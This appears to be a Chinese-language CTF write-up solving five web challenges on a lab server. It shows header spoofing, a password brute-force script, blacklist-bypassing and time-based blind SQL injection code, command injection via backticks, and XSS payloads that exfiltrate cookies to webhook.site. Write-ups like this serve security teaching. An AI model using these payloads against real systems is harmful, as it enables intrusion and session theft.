# CTF Project 2

> [name=作者：中大資工碩一 王聖允]

## 對於進入網站被瀏覽器阻擋的問題
是因為曾經用此瀏覽器連接過 https://ctf.adl.tw/ （CTF 挑戰首頁）
而此網站是有 https 憑證，且強制導向使用 https：
![image](https://hackmd.io/_uploads/SkIvtg7lbe.png)
> [!Note] **使用http協定連接時** 
> * HTTP status 301 Moved Permanently
> * Location：https://ctf.adl.tw/

![image](https://hackmd.io/_uploads/HJ4pqeQl-x.png)
> [!Note] **（Header When Using HTTPS）** 
> * **Strict-Transport-Security**: ... includeSubDomains


> [!Caution] **但是...** 
> 其他 Port 的服務無法用 HTTPS，但瀏覽器卻會開始對此 Domain 嚴格要求 HTTPS

最快解法：
* 開無痕
* **用 ip 直連：140.115.59.10**
    ![image](https://hackmd.io/_uploads/ByFylbQx-l.png)


## subscribe

### 尋找蛛絲馬跡

瀏覽器打開，頁面顯示提示：**Request method must be SUBSCRIBE.**

**運用工具：Command Line Curl（Linux）**
```nginx=
curl -i -X OPTIONS "http://ctf.adl.tw:12002"
```
![image](https://hackmd.io/_uploads/B1yTgWXgZx.png)
> [!Note] **查看接受什麼 Method 的請求**
> （`-i`: include header in output）
> （`-X`: Specify Method） OPTIONS
> *  Allow: OPTIONS, GET, SUBSCRIBE
---
```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002"
```
![image](https://hackmd.io/_uploads/ByY3bW7gZe.png)
> [!Tip] HINT
> **You must use SAKUNA_Browser.**
---
在 Header 中加料：
```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002" \
        -H "User-Agent: SAKUNA_Browser"
```
![image](https://hackmd.io/_uploads/SkvPXZmeZx.png)
> [!Tip] HINT
> **You must come from https://www.subscribesakuna.com.**

**此時想到兩個：** **Origin（此 Request 送出的來源） 或 Referer（從哪個頁面跳轉）？**

---
經過嘗試，是檢查 Referer 的值：
```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002" \
        -H "User-Agent: SAKUNA_Browser" \
        -H "Referer: https://www.subscribesakuna.com"
```
![image](https://hackmd.io/_uploads/BkAefMXeZe.png)
> [!Tip] HINT
> **Host must be sakuna.com.**

---

```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002" \
        -H "User-Agent: SAKUNA_Browser" \
        -H "Referer: https://www.subscribesakuna.com" \
        -H "HOST: sakuna.com"
```
:::spoiler **補充HOST用途**
一個伺服器上可能有許多服務，相同 IP 但註冊不同 Domain Names

例如 Nginx：
```nginx=
server {
    server_name a.com;
    root /var/www/a;
}

server {
    server_name b.com;
    root /var/www/b;
}
```

可以依據 Client 送出的 Host 決定回傳什麼內容
:::

> [!Tip] HINT
> **Invalid cookie . Cookie "sakuna" must have the value kawaiiiiiiiiiiiiiiiiiiiiiiYAHA.**
---
加入 Cookie：
```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002" \
        -H "User-Agent: SAKUNA_Browser" \
        -H "Referer: https://www.subscribesakuna.com" \
        -H "HOST: sakuna.com" \
        --cookie "sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA"
```
也可以使用 `-H "Cookie: sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA"`

**Output:**
```htmlembedded
Now, you must 
<a href="/admin">
    login
</a>
<div style="opacity:0.025"> 
    username ???? & password in SecLists/Passwords/darkweb2017-top10000.txt
</div>
```
> [!Tip] HINT
> * **底下有路徑：**`/admin`
> * **Username:** 未提供
> * **Password:** 在 SecLists/Passwords/darkweb2017-top10000.txt
---

### 密碼爆破

[Kali Linux 官方 Gitlab 提供此 Password 檔案](https://gitlab.com/kalilinux/packages/seclists/-/raw/0aab3b70769ed9faf79b3c1159fb32ef131c7ee6/Passwords/darkweb2017-top10000.txt)

> [!Note] 確認登入方法
> ![image](https://hackmd.io/_uploads/BJ98Mmml-g.png) 
> 瀏覽器會跳出登入框，但要進一步確認 Auth Type（Basic? Digest?）
> ```nginx=
> curl -i -X GET "http://ctf.adl.tw:12002/admin"
> ```
> * Output: **WWW-Authenticate:** **Basic**（Base64 未加密傳輸）
> * 可以直接指令嘗試爆破

寫一個 Bash Script：
```bash=
#!/bin/bash
clear

passwd_source="https://gitlab.com/kalilinux/packages/seclists/-/raw/0aab3b70769ed9faf79b3c1159fb32ef131c7ee6/Passwords/darkweb2017-top10000.txt"
$u="????" # try differnt

curl -s $passwd_source \ # silently curl and pipe to read
| while read p; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -u "$u:$p" \
      http://ctf.adl.tw:12002/admin)
      printf "\r\033[2K\033[1A\033[2K\033[1A\033[2k\033[1A\033[2K\r" # For Pretty Output
      printf "Tried:\n    User: %s\n    Password: %s\n    Status: %s" "$u" "$p" "$code"
    if [ "$code" != "401" ]; then
      echo "[+] possible $u / $p HTTP $code"
      exit
    fi
done
```
自定義要嘗試的 User，掃過整個 Password List
User 提示是 ???? 所以嘗試了常見的 user, root, admin 等，但都不是

想到頁面上有一個資訊：
![image](https://hackmd.io/_uploads/By8oLQQgbx.png)

:::success
**最後嘗試出：**
![image](https://hackmd.io/_uploads/BJhJFXXlZl.png)
* User: SAKUNA
* Password: rainbow6

**登入一樣要符合上面提過的限制（Header 檢查）：**
```nginx=
curl -i -X SUBSCRIBE "http://ctf.adl.tw:12002/admin" \
        -H "User-Agent: SAKUNA_Browser" \                                                       
        -H "Referer: https://www.subscribesakuna.com" \
        -H "HOST: sakuna.com" \                                                    
        --cookie "sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA" \
        -u "SAKUNA:rainbow6"
```
**Flag：**
```
ADLCTF{s4kuNA_kAWA11_5uBSCR1Be_https://youtube.com/channel/UCrV1Hf5r8P148idjoSfrGEQ?si=ksHGQgL0ar79DH5Q}
```
:::

## chiikawa_login_1

![image](https://hackmd.io/_uploads/Bysk9Q7g-l.png)

<kbd>F12</kbd> **開發者模式檢查**

![image](https://hackmd.io/_uploads/Bynhq7QlZx.png)
> [!Tip] HINT
> 可以到 `/?source` 看 Source Code

其他資訊：
![image](https://hackmd.io/_uploads/SkY7o7Qx-e.png)
按下 Submit 會直接將資料以 POST REQUEST 送出至**目前位址**（/），並跳轉
資料欄位為 `username` 與 `password`

看 Source Code：完整請見 [Github](https://github.com/yzu1103309/ctf-dump/blob/main/login.php)

### 幾個重點：
```php=
$host = 'chiikawa_db';
$dbuser = 'MYSQL_USER';
$dbpassword = 'MYSQL_PASSWORD';
$dbname = 'ctf_users';
$link = mysqli_connect($host, $dbuser, $dbpassword, $dbname);
```
可知道帳號密碼，但是 `host = 'chiikawa_db'`
猜測應該是 Docker 建立的服務，外部無法存取
所以沒辦法直連 SQL Server 取得資料

```php=
$loginStatus = NULL;
$username = $_POST['username'];
$password = $_POST['password'];

...

$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";

...
@$fetchs = mysqli_fetch_all($query, MYSQLI_ASSOC);
if ($fetch["username"] === 'Usagi' && $fetch["password"] === $password) {
    $loginStatus = True;
    break;
}
```
直接將 POST DATA 串接到 Query
但會做一些檢查，replace 掉關鍵字
**無 recursively 檢查並取代，所以只要疊加就可以進行 injection**

另外，依照邏輯 Username 只接受 Usagi，取出資料會再比對一次密碼
當 `loginStatus` 是 True 時，就會顯示 Flag

### SQL Injection

> [!Note] **思路：** 
> 關閉引號 ➤ 串接可以**繞過檢查**的 SQL ➤ 後面註解掉

#### 繞過檢查

因為 fetch_all 有 `MYSQLI_ASSOC`
回傳的 Array 會以 Attribute Name 作為 key（Associative Array）
所以原本 `SELECT * FROM users` 會將回傳的資料與欄位自動對應

在原本的條件，讓他回傳任意資料（也可以為空）
並且 UNION 一筆我們控制的資料（UNION：只要欄位數相同，可以合併 Rows）
同時，註解掉 query 中對 password 的判斷。

完整 Query：
```sql=
SELECT * FROM users WHERE `username`='Any' 
    UNION SELECT 0, 'Usagi', '123' -- AND `password` = '';
```

我們控制的部分：
* 要在 username 輸入：
    ```
    ' UNION SELECT 0, 'Usagi', '123' --
    ```
    **記得要疊加黑名單字：**`UNUNIONION`、`SESELECTLECT` 變成： 
    
    ```
    ' UNUNIONION SESELECTLECT 0, 'Usagi', '123' --
    ```
* password 輸入 `123` 即可通過 php 中驗證，`$loginStatus = True;`

---

:::success 
**成功登入**
![image](https://hackmd.io/_uploads/SJ0eHHhg-x.png =50%x)
**Flag:**
```
ADLCTF{1nd04j1n74ch1m3!!!https://youtu.be/BLeZ9r0rJIQ?si=y2T4_Lz2XK-bSCXJ}
```
:::

## chiikawa_login_2

同一個網址，有第二個 Flag，應該是藏在 Database 中的資料
所ㄧ利用注入時間延遲攻擊，爆破出帳號 Usagi 密碼的每一個字元，也許就是 Flag

### 想法
```sql
' || 
IF
( 
    BINARY
    (
        SUBSTR
        (
            (selselectect passwoorrd from users whwhereere username='Usagi'), 
            {position}, 
            1 
        )
    ) = Binary('{char_to_guess}'), 
    SLEEP(5), 
    0 
) #
```

> [!Note] **解說：**
> * 先關閉掉前面查詢 user 的引號，空字串查詢不會有回傳結果
> * 加上一個 OR，後面注入我們要的控制內容：
>     * 取出 users 的 password 欄位，限制帳號名稱為 'Usagi'
>     * 取回傳結果的 SUBSTR，指定 Position，長度 1 個字元並轉成 BINARY
>     * IF 條件判斷，是否等於我們要猜的字元，如果 TRUE 則 SLEEP 5 秒
>     * 後面不要的部份註解掉
>     
> **程式化執行以上步驟進行攻擊，運用時間差判斷是否猜對**
> **嘗試過用 5 秒較為準確（否則可能受網路延遲等因素影響，得到錯誤的字元）**

### Code

```python=
import time
import requests

CHARSET = "abcdefghijklmnopqrstuvwxyz" + 
            "{}_-$./?!=@*#%&()+[]|:;<>~`^'," +
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

flag = ""

unknown_error_count = 0

for position in range(1, 100):
    found_char_for_this_position = False
    
    for char_to_guess in CHARSET:
        payload = f"' || IF( BINARY(SUBSTR( (selselectect passwoorrd from users whwhereere username='Usagi'), {position}, 1 )) = Binary('{char_to_guess}'), SLEEP(5), 0 ) #"
        
        start_time = time.time()
        response = requests.post("http://140.115.59.10:12001", data={'username': payload, 'password': '123'})
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        if elapsed_time >= 5.0:
            print(f"找到第 {position} 個字元: {char_to_guess}")
            flag = flag + char_to_guess
            print(f"目前的 Flag: {flag}")

            found_char_for_this_position = True
            unknown_error_count = 0
            break

    if not found_char_for_this_position:
        print(f"{position}: UNKNOWN!")
        flag = flag + "?"
        unknown_error_count += 1
        
        if unknown_error_count >= 5:
            print("Flag probably already ended")
            break
```

### Output

```
找到第 1 個字元: A
目前的 Flag: A
找到第 2 個字元: D
目前的 Flag: AD
找到第 3 個字元: L
目前的 Flag: ADL
找到第 4 個字元: C
目前的 Flag: ADLC
找到第 5 個字元: T
目前的 Flag: ADLCT
找到第 6 個字元: F
目前的 Flag: ADLCTF
找到第 7 個字元: {
目前的 Flag: ADLCTF{

    ......

找到第 80 個字元: R
目前的 Flag: ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxR
找到第 81 個字元: A
目前的 Flag: ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxRA
找到第 82 個字元: }
目前的 Flag: ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxRA}
83: UNKNOWN!
84: UNKNOWN!
85: UNKNOWN!
86: UNKNOWN!
87: UNKNOWN!
Flag probably already ended
```

:::success
**Flag：**
```!
ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxRA}
```
:::

## moomin

![圖片](https://hackmd.io/_uploads/ryLyhpGZZe.png)

可以看 Source Code，直接看重點：
```php=
<?php if (isset($_POST['json'])) : ?>
    <section class="has-text-left">
        <p>Result:</p>
        <pre><?php
        $blacklist = ['|', '&', ';', '>', '<', "\n", '?', '*', '$', '\\', 'cat', 'flag'];
        $is_input_safe = true;
        foreach ($blacklist as $bad_word)
            if (strstr($_POST['json'], $bad_word) !== false) $is_input_safe = false;

        if ($is_input_safe)
            system("echo '" . $_POST['json'] . "'| jq .moomin");
        else
            echo '<img src="moomin_drifting.gif"/>';
        ?></pre>
    </section>
<?php endif; ?>
```

> [!note] **解說：**
> * PHP 中直接用 `system()` 來執行系統指令
>   將使用者輸入的字串 pipe 進 jq（json processor）
> * 有設定 blacklist，如果包含不合法輸入不執行指令
>   不能用 &、分號斷開指令、導向 std I/O 等，也不能直接 `cat flag`，**但沒有防止註解**

### 本機測試一些情況

**正常使用情況下（使用者輸入部份為 `{"moomin": "abc"}`）：**
![圖片](https://hackmd.io/_uploads/SkMbBRzZ-g.png)

**但是可以：**
![圖片](https://hackmd.io/_uploads/r1NRBAfZbl.png)
（直接關閉引號，再寫一個 Anything，後面註解掉）

> [!Tip] 
> 我們只要在 Anything 的地方注入指令即可！
> 但是不行用 `$`，所以 `$(command)` 不可行，要另外找方法：
> ![圖片](https://hackmd.io/_uploads/H1VnIRzWWg.png)
> 查到可以用 `` 來替代 `$(command)` 進行注入（[資料來源](https://stackoverflow.com/questions/4708549/what-is-the-difference-between-command-and-command-in-shell-programming)）

### **實際上在網頁注入指令：**
![圖片](https://hackmd.io/_uploads/ByTNtCGZZx.png)
不確定是個 directory? 還是一個檔案？
⬇︎
![圖片](https://hackmd.io/_uploads/H1WYqCfZbg.png)
（不能直接寫 flag 會被擋，所以善用引號切開，但依然可以執行）
這邊顯示是檔案，現在只要將內容取出即可
⬇︎
:::success
**用同一招來 `cat /flag`：**
![圖片](https://hackmd.io/_uploads/HyCvjRGb-x.png)
**FLAG：**
```
ADL{CMD_1njECT!https://www.youtube.com/watch?v=LYKTtPFB9b4}
```
:::

### 進階補充：如果不用註解的其他方法

![圖片](https://hackmd.io/_uploads/rk8JJkQbZe.png)
一樣輸入 JSON 格式，用多個引號將字串切分，如果 JSON 合法 jq 會回傳 value
一樣可以在 Anything 處進行指令注入
⬇︎
![圖片](https://hackmd.io/_uploads/SyCkeym-Wx.png)
**It works as well !**

##  msg_board

![圖片](https://hackmd.io/_uploads/HkMcGevWWe.png)
可以送出 Message，送出的訊息將會一直顯示（就算重整）
剛送出會是綠色，重整後變成灰色

### 分析 Requests

按 F12 看網路紀錄
![圖片](https://hackmd.io/_uploads/SJu6NlwZZx.png)
請求 Cookie 會帶 Session ID，代表後端是用 Session 來判斷與保留 Message

向 api 送出訊息，當 `method=send` 時：
![圖片](https://hackmd.io/_uploads/rJhQMeD--x.png)
重整後（網頁向 api 送出 `method=recv`）：
![圖片](https://hackmd.io/_uploads/r1vEGxPZWg.png)

> [!Tip] **重點：**
> `read` 狀態變成 1

### 攻擊思路

`read` 狀態變成 1 的速度很快，猜測另一端有一個 preprogrammed 的 bot 在讀這些訊息
如果另一端的 bot 模擬觀看訊息的平台也是網頁的話，那可以透過注入 html tag 攻擊
來誘導對方瀏覽器進入其他網站，以紀錄對方的身份、IP、Request Header 等資訊

### Tools

* https://webhook.site/
* 或 https://www.postb.in/
* 或 自架服務

### 實做

想要直接用 `onload` 屬性來自動跳轉

支援 `onload`  的 tags：
![圖片](https://hackmd.io/_uploads/HJ8RpZvWbx.png)
來源：https://www.w3schools.com/jsref/event_onload.asp

嘗試過，會擋 `<img>`、`<script>` 等等

最終嘗試：
```htmlembedded!
<iframe onload=window.location="https://webhook.site/XXXX"></iframe>
```

::: success
**沒想到就順利拿到了？**
![圖片](https://hackmd.io/_uploads/BkG5CbvZZl.png)

**Flag：**
```
ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9} 
```
:::

> [!Important] **問題？**
> 通常 Cookies 不是跟隨 Domain 設定的嗎？
> 為什麼導向到 webhook.site 會自帶包含 Flag 的 Cookie？
> 難道是特別為 webhook.site 設定的？

### 補充：釐清 Cookies 疑問

先後嘗試用 **[PostBin](https://www.postb.in/)** 與 **自架服務** 來測試

**直接用自架服務來講解**

運用 cloudflared tunnel 接收 requests，可以留下 Logs

收到的來自 140.115.59.10 的第一次 Request：
```json!
{"level":"debug","event":1,"connIndex":2,"originService":"http://127.0.0.1:80","ingressRule":2,"host":"ss.xxxx.xx","path":"/","headers":{"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Encoding":["gzip, br"],"Accept-Language":["en-US,en;q=0.9"],"Cdn-Loop":["cloudflare; loops=1"],"Cf-Connecting-Ip":["140.115.59.10"],"Cf-Ipcountry":["TW"],"Cf-Ray":["9a5994bdea983324-TPE"],"Cf-Visitor":["{\"scheme\":\"https\"}"],"Cf-Warp-Tag-Id":["4516fe50-ef46-49e8-aa10-067a2b8c3b79"],"Priority":["u=0, i"],"Referer":["http://web/"],"Sec-Ch-Ua":["\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Ch-Ua-Platform":["\"Linux\""],"Sec-Fetch-Dest":["document"],"Sec-Fetch-Mode":["navigate"],"Sec-Fetch-Site":["cross-site"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"],"X-Forwarded-For":["140.115.59.10"],"X-Forwarded-Proto":["https"]},"content-length":0,"time":"2025-11-28T11:38:47Z","message":"GET https://ss.xxxx.xx/ HTTP/1.1"}
```
裡面未帶任何 Cookies！！！
目前 TimeStamp：`11:38:47`


同一時間，N 個 Request 之後的某一個 Request
（在請求網頁的 dependency file 的時候）：
```json!
{"level":"debug","event":1,"connIndex":2,"originService":"http://127.0.0.1:80","ingressRule":2,"host":"ss.xxxx.xx","path":"/static/assets/plugins/global/fonts/keenicons/keenicons-duotone.ttf","headers":{"Accept":["*/*"],"Accept-Encoding":["gzip, br"],"Accept-Language":["en-US,en;q=0.9"],"Cdn-Loop":["cloudflare; loops=1"],"Cf-Connecting-Ip":["140.115.59.10"],"Cf-Ipcountry":["TW"],"Cf-Ray":["9a5994bffe183324-TPE"],"Cf-Visitor":["{\"scheme\":\"https\"}"],"Cf-Warp-Tag-Id":["4516fe50-ef46-49e8-aa10-067a2b8c3b79"],"Cookie":["USERSESSID=ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9}"],"Origin":["https://ss.xxxx.xx"],"Priority":["u=0"],"Referer":["https://ss.xxxx.xx/static/assets/plugins/global/plugins.bundle.css"],"Sec-Ch-Ua":["\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Ch-Ua-Platform":["\"Linux\""],"Sec-Fetch-Dest":["font"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Site":["same-origin"],"User-Agent":["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"],"X-Forwarded-For":["140.115.59.10"],"X-Forwarded-Proto":["https"]},"content-length":0,"time":"2025-11-28T11:38:47Z","message":"GET https://ss.xxxx.xx/static/assets/plugins/global/fonts/keenicons/keenicons-duotone.ttf?eut7fk HTTP/1.1"}
{"level":"debug","event":1,"connIndex":2,"originService":"http://127.0.0.1:80","ingressRule":2,"content-length":187500,"time":"2025-11-28T11:38:47Z","message":"200 OK"}
```
Cookie 突然出現了？！
TimeStamp 一樣是：`11:38:47`（同一秒內）

之後的 **「每一次」** Request 都會帶上這個 Cookie 了：
```json!
{"level":"debug","event":1,"connIndex":2,"originService":"http://127.0.0.1:80","ingressRule":2,"host":"ss.xxxx.xx","path":"/","headers":{"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Encoding":["gzip, br"],"Accept-Language":["en-US,en;q=0.9"],"Cdn-Loop":["cloudflare; loops=1"],"Cf-Connecting-Ip":["140.115.59.10"],"Cf-Ipcountry":["TW"],"Cf-Ray":["9a59c148df9cfdbc-SIN"],"Cf-Visitor":["{\"scheme\":\"https\"}"],"Cf-Warp-Tag-Id":["4516fe50-ef46-49e8-aa10-067a2b8c3b79"],"Cookie":["USERSESSID=ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9}"],"Priority":["u=0, i"],"Referer":["http://web/"],"Sec-Ch-Ua":["\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Ch-Ua-Platform":["\"Linux\""],"Sec-Fetch-Dest":["document"],"Sec-Fetch-Mode":["navigate"],"Sec-Fetch-Site":["cross-site"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"],"X-Forwarded-For":["140.115.59.10"],"X-Forwarded-Proto":["https"]},"content-length":0,"time":"2025-11-28T12:09:12Z","message":"GET https://ss.xxxx.xx/ HTTP/1.1"}
```
TimeStamp `12:09:12` 的時候，以及之後的所有請求都帶 Cookie

> [!Tip]**我的猜測：**
> Server 端的 bot 採用 Selenium 之類的套件（Headless Chrome）
> 在 Script 中會為新的 Request Target Domain 設定這串 Cookie

### 補充：其他解法

如果沒有像前面提到的機制，不會把 Cookie 設定給其他 Domain
那可以把目前 Domain 的 Cookie 當做字串，作為 GET Request 的 data 送出
```htmlembedded!
<iframe onload=window.location=`https://webhook.site/XXXX?flag=${document.cookie}`></iframe>
```

如果 tags 都被擋，不能用 onload：
```htmlembedded!
<details ontoggle=window.location=`https://webhook.site/XXXX?flag=${document.cookie}` open>test</details>
```
預設展開的 `<details>`，且設定展開時行為

**其他：** 嘗試過 `fetch()` 或 `iframe src="webhook"` 都無效
只有 window.location 導向才拿得到 Flag

---
![圖片](https://hackmd.io/_uploads/SkBWRMP-Wg.png =50%x)
